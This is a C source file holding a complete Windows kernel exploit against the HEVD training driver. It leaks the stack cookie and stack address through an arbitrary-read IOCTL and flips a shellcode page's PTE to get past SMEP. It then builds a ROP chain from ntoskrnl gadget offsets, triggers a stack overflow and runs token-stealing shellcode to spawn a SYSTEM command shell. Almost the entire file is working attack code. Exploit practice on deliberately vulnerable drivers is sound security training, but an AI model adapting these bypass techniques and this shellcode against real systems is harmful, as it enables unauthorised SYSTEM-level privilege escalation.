#include "findstack.h"

#define IOCTL_stack_bof_gs 0x222007
#define IOCTL_arbitrary_write 0x22200b

BYTE sc[136] = { 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48, 0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8, 0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07, 0x90, 0x90, 0x90, 0x90 };

typedef struct _aar {
	LPVOID What;
	LPVOID Where;
} aar;


QWORD getDriverBaseAddr(LPCWSTR target_driver) {
	LPVOID drivers_addr[512];
	DWORD cbNeeded = 0;

	if (EnumDeviceDrivers(drivers_addr, sizeof(drivers_addr), &cbNeeded) && cbNeeded < sizeof(drivers_addr)) {
		WCHAR driver_name[512];
		int driver_num = cbNeeded / sizeof(drivers_addr[0]);
		for (int i = 0; i < driver_num; i++) {
			if (GetDeviceDriverBaseName(drivers_addr[i], driver_name, sizeof(driver_name) / sizeof(driver_name[0]))) {
				if (wcscmp(driver_name, target_driver) == 0) {
					return drivers_addr[i];
				}
			}
		}
	}

	return 0;
}

QWORD getPteAddr(QWORD target_addr, QWORD base_addr) {
	target_addr >>= 9;
	target_addr &= 0x7FFFFFFFF8;
	target_addr += base_addr;

	return target_addr;
}

int main() {
	DWORD BytesReturned = 0;
	LPVOID buf = VirtualAlloc(NULL, 624, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!buf) {
		printf("Failed to allocate memory for buf\n");
		exit(0);
	}
	memset(buf, 'A', 624);
	QWORD HevdBase = getDriverBaseAddr(L"HEVD.sys");
	QWORD ntBase = getDriverBaseAddr(L"ntoskrnl.exe");
	aar CookieBuffer = { 0 };

	/////// (0) Get Device Handle from HackSysExtremeVulnerableDriver START
	printf("[+] getting \"HackSysExtremeVulnerableDriver\" handle..\n");
	HANDLE hDevice = CreateFileA((LPCSTR)"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, 0x3, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Failed to get handle from \"HackSysExtremeVulnerableDriver\".. error code: 0x%x\n", GetLastError());
		exit(0);
	}
	printf("[+] Obtained Handle from \"HackSysExtremeVulnerableDriver\"\n");
	/////// (0) Get Device Handle from HackSysExtremeVulnerableDriver END

	/////// (1) Get original cookie from .data section START
	HMODULE hHevdLocalBase = LoadLibraryExA((LPCSTR)"C:\\Users\\dltkrgksmf\\Desktop\\HEVD.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hHevdLocalBase) {
		printf("Failed to Load \"C:\\Users\\dltkrgksmf\\Desktop\\HEVD.sys\"\n");
		exit(0);
	}
	printf("[+] Successfully loaded \"C:\\Users\\dltkrgksmf\\Desktop\\HEVD.sys\"\n");
	printf("[+] searching for .data section...\n");

	PIMAGE_NT_HEADERS HevdImageHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hHevdLocalBase + ((PIMAGE_DOS_HEADER)hHevdLocalBase)->e_lfanew);
	ULONG_PTR HevdSectionHeaderStart = IMAGE_FIRST_SECTION(HevdImageHeader);
	DWORD HevdDataSectionOffset = 0;

	for (int i = 0; i < HevdImageHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER HevdSection = (PIMAGE_SECTION_HEADER)HevdSectionHeaderStart;
		if (strcmp(HevdSection->Name, ".data") == 0) {
			HevdDataSectionOffset = HevdSection->VirtualAddress;
		}
		HevdSectionHeaderStart += sizeof(IMAGE_SECTION_HEADER);
	}
	if (HevdDataSectionOffset == 0) {
		printf("Failed to obtain offset to .data section\n");
		exit(0);
	}
	QWORD HevdDataSection = HevdBase + HevdDataSectionOffset;
	printf("[+] Successfully obtained Offset to .data section from Local HEVD.sys file: 0x%x\n", HevdDataSectionOffset);
	printf("[+] Successfully obtained .data section address from Loaded HEVD.sys file: 0x%llx\n", HevdDataSection);

	QWORD original_cookie = 0;
	CookieBuffer.What = HevdDataSection;
	CookieBuffer.Where = &original_cookie;
	if (!DeviceIoControl(hDevice, IOCTL_arbitrary_write, &CookieBuffer, sizeof(CookieBuffer), NULL, NULL, &BytesReturned, NULL)) { // Leak Stack Cookie from .data section
		printf("failed to IOCTL Arbitrary Write\n");
		exit(0);
	}
	if (original_cookie == 0) {
		printf("failed to leak Stack Cookie from HEVD.sys's .data section\n");
		exit(0);
	}
	printf("[+] Successfully Leaked Cookie Value from running HEVD.sys\n");
	printf("[*] Leaked Original Cookie value: 0x%llx\n", original_cookie);
	/////// (1) Get original cookie from .data section END


	/////// (2) Get Process's Information START
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) {
		printf("Failed to get Module Handle\n");
		exit(0);
	}
	_NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}
	ULONG len = 2000;
	NTSTATUS status = NULL;
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
	do {
		len *= 2;
		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
	} while (status != STATUS_SUCCESS);
	/*
	if (status != STATUS_SUCCESS) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 1;
	}
	*/
	/////// (2) Get Process's Information END


	/////// (3) Leak Our Process's Stack Address START
	UNICODE_STRING MyProcess = { 0 };
	my_RtlEqualUnicodeString myRtlEqualUnicodeString = (my_RtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
	my_RtlInitUnicodeString myRtlInitUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
	if (!myRtlEqualUnicodeString || !myRtlInitUnicodeString) {
		printf("Failed to Obtain Unicode Functions :(\n");
		exit(0);
	}

	myRtlInitUnicodeString(&MyProcess, L"stackbofgs.exe");

	PVOID stackBase = NULL;
	PVOID stackLimit = NULL;

	printf("[+] Leaking our process's stack address...\n");
	while (pProcessInfo->NextEntryOffset != NULL) {
		if (myRtlEqualUnicodeString(&(pProcessInfo->ImageName), &MyProcess, TRUE)) {
			printf("[+] Process: %wZ\n", pProcessInfo->ImageName);
			for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
				stackBase = pProcessInfo->Threads[i].StackBase;
				stackLimit = pProcessInfo->Threads[i].StackLimit;
				printf("[*] Our Process's Stack base: 0x%llx\n", stackBase);
				printf("[*] Our Process's Stack limit: 0x%llx\r\n", stackLimit);
				break;
			}
		}

		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG)pProcessInfo + pProcessInfo->NextEntryOffset);
	}
	if (stackLimit == NULL) {
		printf("Failed to leak our process's stack address\n");
		Sleep(10000);
		exit(0);
	}
	/////// (3) Leak Our Process's Stack Address END


	/////// (4) Obtain RSP value at xor rax(==cookie), rsp && xored Cookie START
	ULONGLONG* stackPointer = (ULONGLONG*)stackLimit;
	ULONGLONG ioctl_aar = 0;
	aar ioctl_buffer = { 0 };
	ioctl_buffer.Where = &ioctl_aar;
	QWORD anchor_addr = NULL;
	QWORD rsp_addr = NULL;
	QWORD xored_cookie = NULL;

	printf("[+] Searching UP for Anchor address, from StackLimit\n");
	while (stackPointer < stackBase) {
		ioctl_buffer.What = stackPointer;
		ioctl_aar = 0;
		if (!DeviceIoControl(hDevice, IOCTL_arbitrary_write, &ioctl_buffer, sizeof(ioctl_buffer), NULL, NULL, &BytesReturned, NULL)) {
			printf("Failed to complete IOCTL\n");
			Sleep(10000);
			exit(0);
		}

		if (ioctl_aar == IOCTL_arbitrary_write) {
			anchor_addr = stackPointer;
			printf("[*] Successfully Obtained Anchor Address: 0x%llx\n", anchor_addr);
			break;
		}

		stackPointer += 1;
	}
	if (anchor_addr == NULL) {
		printf("Failed to obtain anchor's address\n");
		Sleep(10000);
		exit(0);
	}

	rsp_addr = anchor_addr - 0x2a8;
	xored_cookie = rsp_addr ^ original_cookie;
	printf("[*] XORed Cookie Value: 0x%llx\n", xored_cookie);
	/////// (4) Obtain RSP value at xor rax(==cookie), rsp && xored Cookie END


	/////// (5) Flip our shellcode PTE's owner bit to Supervisor bit START
	QWORD pteBase = NULL;
	aar pte_buffer = { 0 };
	QWORD shellcode_pte_value = 0;

	printf("[+] Obtaining PTE Base addr...\n");
	pte_buffer.What = ntBase + 0x26b560 + 0x13;
	pte_buffer.Where = &pteBase;
	if (!DeviceIoControl(hDevice, IOCTL_arbitrary_write, &pte_buffer, sizeof(pte_buffer), NULL, NULL, &BytesReturned, NULL)) {
		printf("Failed to send IOCTL\n");
		Sleep(10000);
		exit(0);
	}
	printf("[*] Obtained PTE Base: 0x%llx\n", pteBase);

	LPVOID Shellcode = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Shellcode) {
		printf("Failed to allocate memory for Shellcode\n");
		Sleep(10000);
		exit(0);
	}
	printf("[+] Address of our Shellcode: 0x%llx\n", Shellcode);
	QWORD shellcode_pte_addr = getPteAddr(Shellcode, pteBase);
	printf("[*] Shellcode's PTE address: 0x%llx\n", shellcode_pte_addr);
	memcpy(Shellcode, sc, sizeof(sc));

	aar pte_value = { 0 };

	printf("[+] Obtaining our shellcode's PTE Value...\n");
	pte_value.What = shellcode_pte_addr;
	pte_value.Where = &shellcode_pte_value;
	if (!DeviceIoControl(hDevice, IOCTL_arbitrary_write, &pte_value, sizeof(pte_value), NULL, NULL, &BytesReturned, NULL)) {
		printf("Failed to send IOCTL\n");
		Sleep(10000);
		exit(0);
	}
	printf("[*] Obtained Shellcode's PTE value: 0x%llx\n", shellcode_pte_value);
	QWORD shellcode_supervisor_mode_pte_value = shellcode_pte_value & ~0x4;
	/////// (5) Flip our shellcode PTE's owner bit to Supervisor bit END


	/////// (6) Chaining ROP START
	QWORD pop_rcx_ret = ntBase + 0x2148c8;
	QWORD pop_rax_ret = ntBase + 0x201862;
	QWORD mov_ptr_rcx_rax_ret = ntBase + 0x21583d;
	QWORD wbinvd_ret = ntBase + 0x381f40;

	*(QWORD*)((QWORD)buf + 512) = xored_cookie; // add xored cookie to our buf to bypass GS
	*(QWORD*)((QWORD)buf + 568) = pop_rcx_ret;
	*(QWORD*)((QWORD)buf + 576) = shellcode_pte_addr;
	*(QWORD*)((QWORD)buf + 584) = pop_rax_ret;
	*(QWORD*)((QWORD)buf + 592) = shellcode_supervisor_mode_pte_value;
	*(QWORD*)((QWORD)buf + 600) = mov_ptr_rcx_rax_ret;
	*(QWORD*)((QWORD)buf + 608) = wbinvd_ret;
	*(QWORD*)((QWORD)buf + 616) = Shellcode;
	/////// (6) Chaining ROP END

	printf("[+] Sending overflow shellcode..");
	Sleep(10000);
	if (!DeviceIoControl(hDevice, IOCTL_stack_bof_gs, buf, 624, NULL, NULL, &BytesReturned, NULL)) {
		printf("Failed to send IOCTL\n");
		Sleep(10000);
		exit(0);
	}

	printf("[*] Executing System Privileged cmd...\n");
	system("cmd");

}